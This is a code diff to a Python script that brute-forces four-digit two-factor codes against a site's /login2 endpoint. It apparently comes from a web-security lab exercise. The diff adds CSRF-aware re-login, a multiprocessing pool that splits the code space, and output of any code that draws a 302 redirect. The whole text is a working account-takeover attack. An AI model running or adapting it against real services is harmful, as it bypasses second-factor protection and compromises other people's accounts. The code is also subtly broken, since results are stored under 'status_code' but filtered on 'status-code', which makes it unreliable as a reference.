@@ -1,3 +1,4 @@
+import multiprocessing
 import sys
 
 import requests
@@ -71,6 +72,8 @@ login_page_csrf = parse_tree_for_csrf(resp.text)
 # Grab response after successful login to grab the csrf token for interaction with 2fa login page
 #   Note: Only 2 2fa code guesses per login, so we will need to restart every two guess from here.
 #   Important Note: For simplicity, going to simply login before every 2fa attempt.
+# Returns:
+#   List of dicts containing code + status pairs.
 def try_2fa_functional_unit(process_number):
     # Arg `process_number` used to extrapolate which number range this functional_unit will try.
     # Ex) worker 1 does 0 - 999, worker 2 does 1000 - 1999 ... worker n does (n-1 * 1000) to (n*1000 - 1)
@@ -82,6 +85,8 @@ def try_2fa_functional_unit(process_number):
         end_range = TOTAL_NUM_CODES
     else:
         end_range = process_number * functional_unit_size - 1
+
+    code_results = []  # Collects code attempted and status
 
     # Main loop, try all 2fa codes in this worker's range.
     for code_num in range(start_range, end_range):
@@ -95,13 +100,45 @@ def try_2fa_functional_unit(process_number):
 
         # Send auth request to 2fa endpoint with csrf token and padded 2fa code number
         login2_url = f'https://{site}/login2'
+        code = str(code_num).zfill(4)
         login2data = {
             'csrf': csrf,
-            'mfa-code': str(code_num).zfill(4)
+            'mfa-code': code
         }
         response = s.post(login2_url, data=login2data, allow_redirects=False)
-        if response.status_code == 302:
-            # Note using debug_print cause the success code is always a desired print out.
-            print(f'2fa valid with response code {response.status_code}')
+        status = response.status_code
+        if status == 302:
+            debug_print(f'2fa valid with response code {status}')
         else:
-            debug_print(f'2fa invalid with response code: {response.status_code}')
+            debug_print(f'2fa invalid with response code: {status}')
+
+        # store result of this attempt before continuing
+        code_results.append({
+            'status_code': status,
+            'mfa-code': code
+        })
+
+    return code_results
+
+
+# Kicks off `num_procs` number of processes which will each run `try_2fa_functional_unit`
+# Returns: A flattened list of response-status/2fa-code pairs
+def concurrent_brute_force_attack(number_of_workers):
+    p = multiprocessing.Pool(number_of_workers)
+    workers_numbers = range(1, number_of_workers+1)
+    collected_results_list = p.map(try_2fa_functional_unit, workers_numbers)
+
+    p.close()
+    flattened = []
+    for group in collected_results_list:
+        flattened.extend(group)
+    return flattened
+
+
+# Execute attack
+results = concurrent_brute_force_attack(num_procs)
+# Filter for any dicts with 'success' status code, a.k.a status code indicating redirect and correct guess.
+successes = filter(lambda x: x['status-code'] == 302, results)
+
+for success in successes:
+    print(f'Found successful 2fa code for login: {success["mfa-code"]}')
